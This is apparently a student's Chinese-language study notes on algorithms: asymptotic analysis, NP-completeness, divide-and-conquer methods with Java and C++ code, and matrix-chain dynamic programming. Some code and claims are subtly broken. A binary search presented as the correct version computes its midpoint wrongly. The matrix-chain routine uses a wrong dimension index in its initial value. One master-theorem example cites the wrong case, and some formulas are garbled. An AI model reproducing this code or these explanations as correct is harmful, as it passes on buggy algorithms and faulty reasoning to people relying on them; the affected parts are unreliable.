log⁡(𝑛!)=Θ(𝑛log⁡𝑛)\n课后题证明以及上下界的练习。\n渐进分析的算术运算与证明\n应该不难，想办法凑就可以。\n常用公式：\n•O(f(n))+O(g(n)) = O(max{f(n),g(n)}) ；\n•O(f(n))+O(g(n)) = O(f(n)+g(n)) ；\n•O(f(n))O(g(n)) = O(f(n)*g(n)) ；\n•O(cf(n)) = O(f(n)) ；\n•g(n)= O(f(n)) ⇒ O(f(n))+O(g(n)) = O(f(n))\n证明示例：以第一个公式举例\n•规则O(f(n)) + O(g(n)) = O(max{f(n),g(n)}) 的证明：\n•对于任意f1(n)∈ O(f(n)) ，存在正常数c1和自然数n1，使得对所有n ≥ n1，有f1(n)≤c1f(n) 。\n•类似地，对于任意g1(n)∈ O(g(n)) ，存在正常数c2和自然数n2，使得对所有n ≥ n2，有g1(n) ≤ c2g(n) 。\n•令c3=max{c1, c2}， n3 =max{n1, n2}，h(n)= max{f(n),g(n)} 。\n•则对所有的 n ≥ n3，有\n•f1(n) +g1(n) ≤ c1f(n) + c2g(n)\n≤ c3f(n) + c3g(n)= c3(f(n) + g(n))\n≤ c3×2 max{f(n),g(n)}\n= 2c3h(n)\n则有f1(n) +g1(n)=O(h(n))= O(max{f(n),g(n)})\n即O(f(n))+O(g(n)) = O(max{f(n),g(n)})\n能搞清楚上下界就没问题。\nNP问题 # 应该会考相关的归约的方法。\n概括 # P：可以“快速解决”的问题（即，多项式时间内能求解）。 NP：可以“快速验证答案”的问题。 NPC（NP-Complete，NP 完全）：目前认为“最难的 NP 问题”，一旦能快速解决一个，就能快速解决所有 NP 问题。 NP-hard（NP 困难）：至少跟 NP 中最难的问题一样难，但本身不一定属于 NP。 解释 # 注意这张图的关系： P（Polynomial Time）问题 # 定义：能在“多项式时间”内求出解的问题。 理解方式：你的程序运行时间是 O(n),O(n2),O(n3)O(n), O(n^2), O(n^3)O(n),O(n2),O(n3) 这种（不是指数或阶乘），就属于 P。 例子： 排序（冒泡、快排） 最短路径（Dijkstra） 匹配括号是否合法（栈） NP（Non-deterministic Polynomial Time）问题 # 定义：解可以在多项式时间内被验证的问题。 关键点：你不一定能很快找到解，但一旦别人告诉你答案，你可以很快验证它对不对。 例子： 给一个图，问是否存在一个旅行路径经过所有城市一次？（TSP） 给一个布尔表达式，问是否存在变量组合使其为真？（SAT） NP 完全（NPC, NP-Complete） # 定义：NP 中最难的问题。 满足两个条件： 本身属于 NP。 所有 NP 问题都可以在多项式时间归约到它上。 通俗理解：它是“NP 阶层中的老大哥”。如果有一天你能快速解决一个 NPC 问题，那你就能快速解决所有 NP 问题（即 P=NPP = NPP=NP）。 著名例子： SAT（布尔可满足性问题） TSP（旅行商问题） 3-Coloring（三染色问题） Subset Sum（子集和问题） NP-hard（NP 困难） # 注意：NP难问题不一定是NP问题！\n定义：比 NP 还难的问题（不一定能验证解）。 不一定在 NP 类别中，比如不要求答案验证要快。 一些 NP-hard 问题甚至不可判定（比如停机问题）。 2.递归和分治策略 # 凡治众如治寡，分数是也。 \u0026mdash;-《孙子兵法》\n求解采用自顶向下的计算方式。\n1.最优子结构。2.小问题可以直接解决。3.最后可以小的问题合并成最终答案。4.子问题之间相互独立。\n概念 # hanoi问题：\n设a,b,c是3个塔座。开始时，在塔座a上有一叠共n个圆盘，这些圆盘自下而上，由大到小地叠在一起。各圆盘从小到大编号为1,2,…,n,现要求将塔座a上的这一叠圆盘移到塔座b上，并仍按同样顺序叠置。在移动圆盘时应遵守以下移动规则：\n规则1：每次只能移动1个圆盘；\n规则2：任何时刻都不允许将较大的圆盘压在较小的圆盘之上；\n规则3：在满足移动规则1和2的前提下，可将圆盘移至a,b,c中任一塔座上。\nvoid hanoi(int n, int a, int b, int c) { if (n \u0026gt; 0) { hanoi(n-1, a, c, b);\t//设法将n-1个较小的圆盘依照移动规则从塔座a移至塔座c move(a,b);\t//将塔座a上编号为n的圆盘移到b上 hanoi(n-1, c, b, a);\t//设法将n-1个较小的圆盘依照移动规则从塔座c移至塔座b } } 一般的流程：\nvoid divide-and-conquer(P) { if ( | P | \u0026lt;= n0) adhoc(P); //解决小规模的问题 divide P into smaller subinstances P1,P2,...,Pk；//分解问题 for (i=1,i\u0026lt;=k,i++){ yi=divide-and-conquer(Pi); }\t//递归的解各子问题 return merge(y1,...,yk); //将各子问题的解合并为原问题的解 } 递归的求解 # ​\t一个分治法将规模为n的问题分成k个规模为n／m的子问题去解。设分解阀值n0=1，且adhoc解规模为1的问题耗费1个单位时间。再设将原问题分解为k个子问题以及用merge将k个子问题的解合并为原问题的解需用f(n)个单位时间。\n1.递归树法 # 考虑分解和合并的时间：\n由于该递归表达式分为两项，所以算树的高度时，我们只需要看n/2的分解，由\n𝑛2ℎ=1\n可得递归树的层数为\nℎ=log2⁡𝑛\n分解的时间消耗为\n𝑡1\\len2(1+516+25256+\u0026hellip;+(516)log2⁡𝑛−1=(516)log2⁡𝑛−1516−1\u0026lt;1611𝑛2\n则有\n𝑡1=𝑂(𝑛2)\n叶子节点小于n个，所以合并就是O（n），那么最终就为t1。\n2.主方法 # 令和𝑎≥1和𝑏\u0026gt;1是常数，𝑓(𝑛)是一个函数，𝑇(𝑛)是定义在非负整数上的递归式： 𝑇(𝑛)=𝑎𝑇(𝑛𝑏)+𝑓(𝑛)\nT(n) 有如下渐进界：\n1️⃣ 若对某个常数 ϵ \u0026gt; 0 有𝑓(𝑛)=𝑂(𝑛log𝑏⁡𝑎−𝜖)，则 T ( n ) = Θ (nlogba)\n2️⃣ 若𝑓(𝑛)=Θ(𝑛log𝑏⁡𝑎)，则𝑇(𝑛)=Θ(𝑛log𝑏⁡𝑎lg⁡𝑛)\n3️⃣ 若对某个常数 ϵ \u0026gt; 0 有𝑓(𝑛)=Ω(𝑛log𝑏⁡𝑎+𝜖)，且对某个常数𝑐\u0026lt;1和足够大的n有𝑎𝑓(𝑛/𝑏)≤𝑐𝑓(𝑛)则\nT ( n ) = Θ ( f ( n ) )\n注意点\n在第一种情况中，不是𝑓(𝑛)小于𝑛log𝑏⁡𝑎就够了，而是要多项式意义上的小于，也就是说，𝑓(𝑛)必须渐进小于𝑛log𝑏⁡𝑎，要相差一个因子𝑛𝜖。\n其中𝜖是大于0的常数。\n在第三种情况中，不是𝑓(𝑛)大于𝑛log𝑏⁡𝑎就够了，而是要多项式意义上的大于，而且还要满足\u0026quot;正则\u0026quot;条件𝑎𝑓(𝑛/𝑏)≤𝑐𝑓(𝑛)。遇到的多项式界的函数中，多数都满足这个条件。\n此外，这三种情况并非覆盖了𝑓(𝑛)的所有情况，𝑓(𝑛)可能小于𝑛log𝑏⁡𝑎，但不是多项式意义上的小于，也有可能大于但不是多项式意义上的大于，这时候就不能用主方法来求解，而是需要用递归树。\n举例说明 # 1️⃣ T (n) = 9 T (n/3) + n\n​\t有𝑎=9,𝑏=3,𝑓(𝑛)=𝑛,因此𝑛log𝑏⁡𝑎=𝑛log3⁡9=Θ(𝑛2)，当我们取𝜖=1,有𝑓(𝑛)=𝑂(𝑛log3⁡9−1)，由定理一则有𝑇(𝑛)=Θ(𝑛2)\n2️⃣ T (n) = T (2n/3) + 1\n​\t有𝑎=1,𝑏=3/2,𝑓(𝑛)=1,因此𝑛log𝑏⁡𝑎=𝑛log3/2⁡1=𝑛0=Θ(1)，由于𝑓(𝑛)=Θ(𝑛log𝑏⁡𝑎)=Θ(1)，由定理二则有𝑇(𝑛)=Θ(lg⁡𝑛)\n3️⃣ T (n) = 3 T (n/4) + nlgn\n​\t有𝑎=3,𝑏=4,𝑓(𝑛)=𝑛lg⁡𝑛,因此𝑛log𝑏⁡𝑎=𝑛log4⁡3=𝑂(𝑛0.793)，由于𝑓(𝑛)=Ω(𝑛log4⁡3+𝜖)，其中𝜖≈0.2，因此如果可以证明正则条件成立，则可以使用定理三。当n足够大时，对于𝑐=3/4，（𝑎𝑓(𝑛/𝑏)=3（𝑛/4)lg⁡(𝑛/4)≤(3/4)𝑛lg⁡𝑛=𝑐𝑓(𝑛)，由定理二则有𝑇(𝑛)=Θ(𝑛lg⁡𝑛)\n⚠️主方法不适用于𝑇(𝑛)+2𝑇(𝑛/2)+𝑛lg⁡𝑛\n​\t有𝑎=2,𝑏=2,𝑓(𝑛)=𝑛lg⁡𝑛,因此𝑛log𝑏⁡𝑎=𝑛，𝑓(𝑛)虽然渐进大于n，但是并不是多项式意义上的的大于**(比值要是n的次方)**，对于任意的正常数𝜖，比值𝑓(𝑛)/𝑛log𝑏⁡𝑎=lg⁡𝑛都渐进小于𝑛𝜖，陷入了特殊情况，使用递归树可解决。\n可以这么理解，谁大就由谁来决定，相等的情况就是对数和算出来的式子直接做乘法。\n分治算法具体问题设计 # merge and sort\n1.二分算法 # class Solution { public int search(int[] nums, int target) { int left = 0; int right = nums.length - 1; while(left \u0026lt;= right){ int mid = left + (right - left) / 2; if(nums[mid] \u0026lt; target){ left = mid + 1; }else if(nums[mid] \u0026gt; target){ right = mid - 1; }else{ return mid; } } return -1; } } ​\t每执行一次算法的while循环，待搜索的数组的大小就减少一半。因此，在最坏情况下，while循环被执行了𝑂(log⁡𝑛)次。循环体内运算需要𝑂(1)时间，因此整个算法在最坏情况下的时间复杂性为𝑂(log⁡𝑛)。\n二分代码的纠错，写出bugfree的二分代码，分析七个二分算法的错误。\n下标变化错误，会进入死循环。（1 2 3 5 6 7 这个序列中去找数字4）\nright控制的有问题，当要查找的数据在最右边的时候就找不到了（1 2 3 5 6 7 中找 7）\n和上面是同理的，left + 1 != right 就是 left \u0026lt; right - 1\n下标控制错误，left = middle + 1,当要查找的元素为数组中的最后一个的时候，此时陷入死循环。\nclass Solution { public int search(int[] nums, int target) { int left = 0; int right = nums.length - 1; while(left \u0026lt; right){ int mid = left + (right - left) + 1 / 2; if(nums[mid] \u0026lt; target){ left = mid; }else if(nums[mid] \u0026gt; target){ right = mid - 1; }else{ return mid; } } if(target == nums[left]){ return left; } return -1; } } 第五个是正确的代码，middle控制的向上作取整可以使得left不用等于middle加1,当有多个重复的时候，取的值是最右边的值。\n多了right = mid - 1，这样我们就没办法找到最右边的值了。注意这两个代码都是 left \u0026lt; right 而非相等的。\nright = mid，右边的值到不了左边来，那么当你找的数字为第一个元素的时候就会陷入死循环。\n从判断错误的角度来讲，举极端例子（找最左边或者最右边），或者数组长度只有1的情况都是很好的方法。\n2.大整数乘法 # 处理两个位数很大的数字的乘法：\n用类似于因式分解的方法，把原来的两次乘法改成一次乘法，但是只是多了几次加法而已。\n3.Strassen矩阵乘法 # 这一部分可以看书，把八次乘法转换成了七次的乘法，和上面的大整数乘法是类似的思想。\n4.棋盘覆盖问题 # ​\t在一个2𝑘×2𝑘 个方格组成的棋盘中，恰有一个方格与其它方格不同，称该方格为一特殊方格，且称该棋盘为一特殊棋盘。在棋盘覆盖问题中，要用图示的4种不同形态的L型骨牌覆盖给定的特殊棋盘上除特殊方格以外的所有方格，且任何2个L型骨牌不得重叠覆盖。\n​\t将2𝑘×2𝑘 棋盘分割为4个2𝑘−1×2𝑘−1 子棋盘(a)所示。特殊方格必位于4个较小子棋盘之一中，其余3个子棋盘中无特殊方格。为了将这3个无特殊方格的子棋盘转化为特殊棋盘，可以用一个L型骨牌覆盖这3个较小棋盘的会合处，如 (b)所示，从而将原问题转化为4个较小规模的棋盘覆盖问题。递归地使用这种分割，直至棋盘简化为棋盘1×1。\n​\t解此递归方程可得𝑇(𝑘)=𝑂(4𝑘)，由于覆盖一个2𝑘×2𝑘 棋盘所需要的L型骨牌个数为(4𝑘−1)/3，所以该算法为一个在渐进意义下的最优算法。\n5.合并排序（merge sort） # ​\t基本思想：将待排序元素分成大小大致相同的2个子集合，分别对2个子集合进行排序，最终将排好序的子集合合并成为所要求的排好序的集合。\n最坏时间复杂度：O(nlogn)\t平均时间复杂度：O(nlogn)\t辅助空间：O(n)\n最坏情况下的时间复杂度：\n​\t概念：解此递归方程为𝑇(𝑛)=𝑂(𝑛log⁡𝑛)，由于排序问题的计算时间下界为Ω(𝑛log⁡𝑛)，所以合并排序算法为一个渐进最优算法。\n​\t对于算法MergeSort，可以利用分治法消除其中的递归。可以先将数组a中相邻的元素两两配对，用合并算法将他们排序，构成n/2组长度为2的排好序的子数组段，然后再把它们排成长度为4的排好序的子数组段，如此继续下去，直至整个数组排好序。\npackage Recursion; public class MergeSort { private void sortArray(int[] array) { merge(array, 0, array.length - 1); } private void mergeSort(int[] array, int left, int mid, int right) { int[] temp1 = new int[mid - left + 1]; int[] temp2 = new int[right - mid]; for (int i = 0; i \u0026lt; temp1.length; i++) { temp1[i] = array[left + i]; } for (int i = 0; i \u0026lt; temp2.length; i++) { temp2[i] = array[mid + 1 + i]; } int i = 0, j = 0; int k = left; while (i \u0026lt; temp1.length \u0026amp;\u0026amp; j \u0026lt; temp2.length) { //注意这里保证了排序的稳定性，小于等于就直接放进去 if (temp1[i] \u0026lt;= temp2[j]) { array[k] = temp1[i]; ++i; ++k; }else{ array[k] = temp2[j]; ++j; ++k; } } while (i \u0026lt; temp1.length) { array[k] = temp1[i]; ++i; ++k; } while (j \u0026lt; temp2.length) { array[k] = temp2[j]; ++j; ++k; } } private void merge(int[] array, int left , int right){ if(left \u0026lt; right){ int mid = left + (right - left)/2; merge(array, left, mid); merge(array, mid + 1, right); mergeSort(array, left, mid, right); } } public static void main(String[] args) { int[] array = {9,8,7,6,5,4,3,2,1}; MergeSort mergeSort = new MergeSort(); mergeSort.sortArray(array); for(int index = 0; index \u0026lt; array.length; index++){ System.out.print(array[index] + \u0026#34; \u0026#34;); } } } 6.快速排序（Quick Sort） # ​\t在快速排序中，记录的比较和交换是从两端向中间进行的，关键字较大的记录一次就能交换到后面单元，关键字较小的记录一次就能交换到前面单元，记录每次移动的距离较大，因而总的比较和移动次数较少。\n算法分析如下：\n对于输入的子数组a[p:r]，按照以下三个步骤排序：\n1️⃣ 分解：以a[p]作为基准元素将a[p:r]分解为三段a[p:q-1],a[q],a[q+1:r]，使a[p:q-1]中的任意一个元素小于等于a[q]，a[q+1:r]中任何一个元素大于等于a[q]，下标在划分过程中确定。\n2️⃣ 递归求解：通过递归调用快速排序算法，分别对a[p:q-1]和a[q+1:r]进行排序\n3️⃣ 合并：由于对a[p:q-1]和a[q+1:r]的排序使就地进行的，因此排好序后不需要再执行其他计算。\npackage Recursion; public class QuickSort { public static void main(String[] args) { int[] arr = {15,14,13,12,11,10,9,8,7,6,5,4,3,2,1}; quickSort(arr,0,arr.length-1); for(int a:arr){ System.out.print(a + \u0026#34; \u0026#34;); } } private static void quickSort(int[] arr, int left, int right) { if(left \u0026lt; right){ int partitionIndex = partition(arr, left, right); quickSort(arr, left, partitionIndex-1); quickSort(arr, partitionIndex+1, right); } } private static int partition(int[] arr, int left, int right) { int pivot = arr[left]; while(left \u0026lt; right){ //找到第一个小于pivot的元素 while(left \u0026lt; right \u0026amp;\u0026amp; arr[right] \u0026gt;= pivot){ right--; } //把右边的值移到左边来 arr[left] = arr[right]; //找到第一个大于pivot的元素 while(left \u0026lt; right \u0026amp;\u0026amp; arr[left] \u0026lt;= pivot){ left++; } //把左边的值移到右边来 arr[right] = arr[left]; } //最后进行交换 arr[left] = pivot; return left; } } 这里是取第一个元素作为划分的基准，如果取最后一个元素作为基准而且其是数组中最大的元素，那么会陷入死循环。\n对于输入序列a[p:r] , Partition的计算时间显然为𝑂(𝑟−𝑝−1)。\n​\t快速排序的运行时间与划分是否对称有关,其最坏情况发生在划分过程产生的两个区域分别包含n- 1个元素和1个元素的时候。由于函数Partition的计算时间为𝑂(𝑛),所以如果算法Partition的每一步都出现这种不对称划分,则其计算时间复杂性T(n) 满足 解此递归方程可得𝑇(𝑛)=𝑂(𝑛2)。\n​\t在最好情况下,每次划分所取的基准都恰好为中值,即每次划分都产生两个大小为n/2的区域，此时，Partition的计算时间T(n)满足 ​\t可以证明,快速排序算法在平均情况下的时间复杂性也是 T ( n ) = O ( n log ⁡ n ) ,这在基于比较的排序算法类中算是快速的,快速排序也因此而得名。\n​\t随机选取值而不是每次都选取第一个就可以解决这个问题。\n7.线性时间选择 # ⭐ 要能根据代码分析时间复杂度\n​\t给定线性序集中n个元素和一个整数k，1≤k≤n，要求找出这n个元素中第k小的元素，只需要调用如下方法：RandomizedSelect(a,0,n-1,k)\ntemplate\u0026lt;class Type\u0026gt; Type RandomizedSelect(Type a[],int p, int r, int k){ if(p==r) return a[p]; int i = RandomizePartition(a,p,r); j=i-p+1; if(k\u0026lt;=j) return RandomizedSelect(a,p,i,k); else return RandomizedSelect(a,i+1,r,k-j); } ​\t在算法RandomizedSelect中执行RandomizedPartition后;数组a[p:r]被划分成两个子数组a[p:i]和a[i+1:r],使得中每个元素都不大于a[i+1:r]中每个元素。接着算法计算子数组a[p:i]中元素个数j。如果k≤j,则a[p:r]中第k小元素落在子数组a[p:i]中如果k\u0026gt; j,则要找的第k小元素落在子数组a[i+1:r]中。由于此时已知道子数组a[p:i]中元素均小于要找的第k小元素,因此，要找的a[p:r]中第k小元素是a[i+ 1:r]中的第k- j 小元素。\n​\t在最坏情况下,算法RandomizedSelect需要𝑂(𝑛2)计算时间。例如在找最小元素时，总是在最大元素处划分。尽管如此,该算法的平均性能很好。在平均情况下，算法RandomizedSelect可以在𝑂(𝑛)时间内解决⭐\n​\t如果能在线性时间内找到一个划分基准，使得按这个基准所划分出的2个子数组的长度都至少为原数组长度的ε倍(0\u0026lt;ε\u0026lt;1是某个正常数)，那么就可以在最坏情况下用O(n)时间完成选择任务。例如，若ε=9/10，算法递归调用所产生的子数组的长度至少缩短1/10。所以，在最坏情况下，算法所需的计算时间T(n)满足递归式T(n)≤T(9n/10)+O(n) 。由此可得T(n)=O(n)。\n寻找划分标准的算法如下：\n分组，寻找中位数的中位数，这样的分割位置相对来说比较公平。\n​\t1️⃣ 将n个输入元素划分成⌈𝑛/5⌉个组，每组5个元素，只可能有一个组不是5个元素。用任意一种排序算法，将每组中的元素排好序，并取出每组的中位数，共⌈𝑛/5⌉个。\n​\t2️⃣ 递归调用Select来找出这⌈𝑛/5⌉个元素的中位数。如果⌈𝑛/5⌉是偶数，就找它的2个中位数中较大的一个。以这个元素作为划分基准。\n​\t设所有元素互不相同。在这种情况下，找出的基准x至少比3(n-5)/10个元素大，因为在每一组中有2个元素小于本组的中位数，而n/5个中位数中又有(n/5-1)/2=(n-5)/10个小于基准x。同理，基准x也至少比3(n-5)/10个元素小。而当n≥75时，3(n-5)/10≥n/4所以按此基准划分所得的2个子数组的长度都至少缩短1/4。\ntemplate\u0026lt;class Type\u0026gt; Type Select(Type a[], int p, int r, int k) { if (r-p\u0026lt;75) { Sort(Type a[], int p, int r); //用某个简单排序算法对数组a[p:r]排序; return a[p+k-1]; }; for ( int i = 0; i\u0026lt;=(r-p-4)/5; i++ ) //将a[p+5*i]至a[p+5*i+4]的第3小元素与a[p+i]交换位置; Type x = Select(a, p, p+(r-p-4)/5, (r-p-4)/10); //找中位数的中位数，r-p-4即上面所说的n-5 int i=Partition(a,p,r, x), j=i-p+1; if (k\u0026lt;=j) return Select(a,p,i,k); else return Select(a,i+1,r,k-j); } ​\t上述算法将每一组的大小定为5，并选取75作为是否作递归调用的分界点。这2点保证了T(n)的递归式中2个自变量之和n/5+3n/4=19n/20=εn，0\u0026lt;ε\u0026lt;1。这是使T(n)=O(n)的关键之处。当然，除了5和75之外，还有其他选择\n时间复杂度分析为： 解得：𝑇(𝑛)=𝑂(𝑛)，要会用递归树求解\n看不懂就记住时间复杂度为O（n），考试前再看一下原理，记忆一下数字规律也可以。\n8.最近点对问题 # 会写伪代码，典型的简答题。\n给定平面上n个点，找其中的一对点，使得在n个点组成的所有点对中，该点对的距离最小。\n​\t为了使问题易于理解和分析，先来考虑一维的情形。此时，S中的n个点退化为x轴上的n个实数 x1,x2,…,xn。最接近点对即为这n个实数中相差最小的2个实数。\n​\t假设我们用x轴上某个点m将S划分为2个子集S1和S2 ，基于平衡子问题的思想，用S中各点坐标的中位数来作分割点。递归地在S1和S2上找出其最接近点对{p1,p2}和{q1,q2}，并设d=min{|p1-p2|,|q1-q2|}，S中的最接近点对或者是{p1,p2}，或者是{q1,q2}，或者是某个{p3,q3}，其中p3∈S1且q3∈S2。如果S的最接近点对是{p3,q3}，即|p3-q3|\u0026lt;d，则p3和q3两者与m的距离不超过d，即p3∈(m-d,m]，q3∈(m,m+d]。由于在S1中，每个长度为d的半闭区间至多包含一个点（否则必有两点距离小于d），并且m是S1和S2的分割点，因此(m-d,m]中至多包含S中的一个点。由图可以看出，如果(m-d,m]中有S中的点，则此点就是S1中最大点，同理S2这么找就会找到最小的点。因此，我们用线性时间就能找到区间(m-d,m]和(m,m+d]中所有点，即p3和q3。从而我们用线性时间就可以将S1的解和S2的解合并成为S的解。\n以下是二维的情况：\n​\t选取一垂直线l:x=m来作为分割直线。其中m为S中各点x坐标的中位数。由此将S分割为S1和S2。递归地在S1和S2上找出其最小距离d1和d2，并设d=min{d1,d2}，S中的最接近点对或者是d，或者是某个{p,q}，其中p∈P1且q∈P2。\n考虑P1中任意一点p，它若与P2中的点q构成最接近点对的候选者，则必有distance(p，q)＜d。满足这个条件的P2中的点一定落在一个d×2d的矩形R中由d的意义可知，P2中任何2个S中的点的距离都不小于d。由此可以推出矩形R中最多只有6个S中的点。因此，在分治法的合并步骤中最多只需要检查6×n/2=3n个候选者\n⭐ 证明 将矩形R的长为2d的边3等分，将它的长为d的边2等分，由此导出6个(d/2)×(2d/3)的矩形。若矩形R中有多于6个S中的点，则由鸽舍原理易知至少有一个(d/2)×(2d/3)的小矩形中有2个以上S中的点。设u，v是位于同一小矩形中的2个点，则\n​\t证明就是六等分，那么一个小矩形的对角边就是最大的长度。\ndistance(u,v)\u0026lt;d。这与d的意义相矛盾。图b是具有6个S中的点的极端情况。\n由上述证明可知，在分治法的合并步骤中，最多只需要检查6xn/2=3n个候选者，而不是n^2/4个。\n​\t为了确切地知道要检查哪6个点，可以将p和P2中所有S2的点投影到垂直线l上。由于能与p点一起构成最接近点对候选者的S2中点一定在矩形R中，所以它们在直线l上的投影点距p在l上投影点的距离小于d。由上面的分析可知，这种投影点最多只有6个。因此，若将P1和P2中所有S中点按其y坐标排好序，则对P1中所有点，对排好序的点列作一次扫描，就可以找出所有最接近点对的候选者。对P1中每一点最多只要检查P2中排好序的相继6个点。\n以下就是伪代码：\ndouble cpair2(S) { n=|S|; if (n \u0026lt; 2) return 无穷; 1、m=S中各点x间坐标的中位数; //构造S1和S2； S1={p∈S|x(p)\u0026lt;=m}; S2={p∈S|x(p)\u0026gt;m}; //作递归的处理 2、 d1=cpair2(S1); d2=cpair2(S2); //找到集合内的最近距离点对，并且记录大小 3、dm=min(d1,d2); //预先排序的处理 4、设P1是S1中距垂直分割线l的距离在dm之内的所有点组成的集合； P2是S2中距分割线l的距离在dm之内所有点组成的集合； 将P1和P2中点依其y坐标值排序； 并设X和Y是相应的已排好序的点列； //1对6的扫描找最小值 所以最多是3 * n 5、通过扫描X以及对于X中每个点检查Y中与其距离在dm之内的所有点(最多6个)可以完成合并； 当X中的扫描指针逐次向上移动时，Y中的扫描指针可在宽为2dm的区间内移动； 设dl是按这种扫描方式找到的点对间的最小距离； 6、d=min(dm,dl); return d; } 核心过程就是第五步。\n​\t下面分析算法Cpair2的计算复杂性。设对于n个点的平面点集S ,算法耗时T(n)。算法的第1步和第5步用了𝑂(𝑛)时间。第3步和第6步用了常数时间。第2步用了2T(n/2)时间。若在每次执行第4步时进行排序,则在最坏情况下第4步要用𝑂(𝑛log⁡𝑛)时间。这不符合我们 的要求。因此，在这里我们采用设计算法时常用的预排序技术,在使用分治法之前,预先将S中n个点依其y坐标值排好序,设排好序的点列为P 。在执行分治法的第4步时,只要对𝑃∗作一次线性扫描,即可抽取出我们所需要的排好序的点列X和Y。然后，在第5步中再对X作一次线性扫描,即可求得dl.因此,第4步和第5步的两遍扫描合在一起只要用0(n)时间。这样,经过预排序处理后算法Cpair2 所需的计算时间T(n)满足递归方程 由此易知, T (n) = O(nlogn) 。预排序所需的计算时间显然为𝑂(𝑛log⁡𝑛)。因此,整个算法所需的计算时间为𝑂(𝑛log⁡𝑛),在渐近的意义下,此算法已是最优算法。\n注意考试的时候要写上边界（n = 4）。\n3.动态规划 # 基本概念和步骤 # 1、与分治法的异同 # 相同点：都是将求解问题分为若干个子问题\n不同点：分治法所要求的子问题是独立的，而动态规划所求解的子问题往往不是独立的，重叠的子问题的多次运算可能会造成指数级的运算量。\n2、动态规划的核心思想 # **记表备查：**保存已解决的子问题的答案，而在需要时再找出已求得的答案，就可以避免大量重复计算，从而得到多项式时间算法。\n3、解题步骤 # 1️⃣ 找出最优解的性质，并刻划其结构特征。\n2️⃣ 递归地定义最优值。\n3️⃣ 以自底向上的方式计算出最优值。\n4️⃣ 根据计算最优值时得到的信息，构造最优解\n4、基本要素 # 重叠子问题与最优子结构。\n矩阵连乘计算次序问题的最优解包含着其子问题的最优解。这种性质称为最优子结构性质。\n要证明最优子结构的性质。\n最优子结构的证明通常采用反证法，需要掌握。\n全局的最优一定有局部的最优，局部的最优不一定会形成全局的最优，必要不充分条件\n5、两种基本形态 # 动态规划(自底向上)与备忘录（memo）方法。\n备忘录方法是动态规划方法的变形，都是记表备查，不同点在于备忘录方法是自顶向下的递归，而动态规划是自底向上的递归\n一般来说，当一个问题的所有子问题都需要至少解一次时，用动态规划算法比用备忘录方法要好\n具体问题设计 # 1.*矩阵连乘问题 # ​\t给定n个矩阵𝐴1,𝐴2,…,𝐴𝑛，其中𝐴𝑖与𝐴𝑖+1是可乘的，i=1, 2,…, n-1。考察这n个矩阵的连乘积𝐴1𝐴2…𝐴𝑛。\n​\t由于矩阵乘法满足结合律，所以计算矩阵的连乘可以有许多不同的计算次序。这种计算次序可以用加括号的方式来确定。若一个矩阵连乘积的计算次序完全确定，也就是说该连乘积已完全加括号，则可以依此次序反复调用2个矩阵相乘的标准算法计算出矩阵连乘积。\n完全加括号的矩阵连乘积可递归地定义为：\n①单个矩阵是完全加括号的；\n②矩阵连乘积A是完全加括号的，则A可表示为2个完全加括号的矩阵连乘积B和C的乘积并加括号，即A=(BC)\n设有四个矩阵A,B,C,D，可以有以下5种不同的加括号方式：\n(A(B(CD))) (A((BC)D)) ((AB)(CD)) ((A(BC))D) (((AB)C)D)\n​\t每一种完全加括号方式对应于一种矩阵连乘积的计算次序，而矩阵连乘积的计算次序与其计算量有密切关系。矩阵A(p×q)和矩阵B(q×r)的乘积C=AB是一个p×r的矩阵，数乘次数为pqr\n❓ 问题：\n给定n个矩阵𝐴1,𝐴2,…,𝐴𝑛，其中𝐴𝑖与𝐴𝑖+1是可乘的，i=1, 2,…, n-1。如何确定计算矩阵连乘积的计算次序，使得依此次序计算矩阵连乘积需要的数乘次数最少。\n1）穷举法 # 计算次序相应需要的数乘次数，从中找出一种数乘次数最少的计算次序。\n对于n个矩阵的连乘积，设其不同的计算次序为P(n)。由于每种加括号方式都可以分解为两个子矩阵的加括号问题：(A1\u0026hellip;Ak)(Ak+1…An)可以得到关于P(n)的递推式如下：\n这个数字太大，没有计算价值。\n2）动态规划法 # 将矩阵连乘积AiAi+1…Aj简记为A[i:j] ，这里i≤j 。\n考察计算A[i:j]的最优计算次序。设这个计算次序在矩阵Ak和Ak+1之间将矩阵链断开，i≤k\u0026lt;j，则其相应完全加括号方式为：\n(AiAi+1…Ak) (Ak+1Ak+2…Aj)\n计算量：A[i:k]的计算量加上A[k+1:j]的计算量，再加上A[i:k]和A[k+1:j]相乘的计算量。\n1️⃣ 分析最优解的结构\n特征：计算A[i:j]的最优次序所包含的计算矩阵子链 A[i:k]和A[k+1:j]的次序也是最优的。\n矩阵连乘计算次序问题的最优解包含着其子问题的最优解。这种性质称为最优子结构性质。问题的最优子结构性质是该问题可用动态规划算法求解的显著特征。\n2️⃣ 建立递归关系\n设计算A[i:j]，1≤i≤j≤n，所需要的最少数乘次数m[i,j]，则原问题的最优值为m[1,n]。\n设Ai的维数为𝑝𝑖−1×𝑝𝑖，则\n当i=j时，𝐴[𝑖:𝑗]=𝐴𝑖，因此，m[i,i]=0，i=1,2,…,n\n当i\u0026lt;j时，𝑚[𝑖:𝑗]=𝑚[𝑖,𝑘]+𝑚[𝑘+1,𝑗]+𝑝𝑖−1𝑝𝑘𝑝𝑗\n可以递归地定义m[i,j]为：\n必考问题。\nk的位置只有j-i种可能\n3️⃣ 计算最优值\n对于1≤i≤j≤n不同的有序对(i,j)对应于不同的子问题。因此，不同子问题的个数最多只有\n​\t由此可见，在递归计算时，许多子问题被重复计算多次。这也是该问题可用动态规划算法求解的又一显著特征\n用动态规划算法解此问题，可依据其递归式以自底向上的方式进行计算。在计算过程中，保存已解决的子问题答案。每个子问题只计算一次，而在后面需要时只要简单查一下，从而避免大量的重复计算，最终得到多项式时间的算法。\n代码如下：\npublic static void matrixChain(int[] p, int[][] dp, int[][] partitionIndex){ //有n个矩阵 int n = p.length - 1; //初始化为0 for(int index = 0; index \u0026lt; n; ++index){ dp[index][index] = 0; } //控制矩阵链的长度 for(int len = 2; len \u0026lt;= n; ++len){ for(int i = 1; i \u0026lt;= n - len + 1; ++i){ //以第一个为基础 int j = i + len - 1; dp[i][j] = dp[i + 1][j] + p[i + 1] * p[i] * p[j]; partitionIndex[i][j] = i; for(int k = i + 1; k \u0026lt; j; ++k){ int value = dp[i][k] + p[i - 1] * p[k] * p[j] + dp[k + 1][j]; if(value \u0026lt; dp[i][j]){ dp[i][j] = value; partitionIndex[i][j] = k; } } } } } 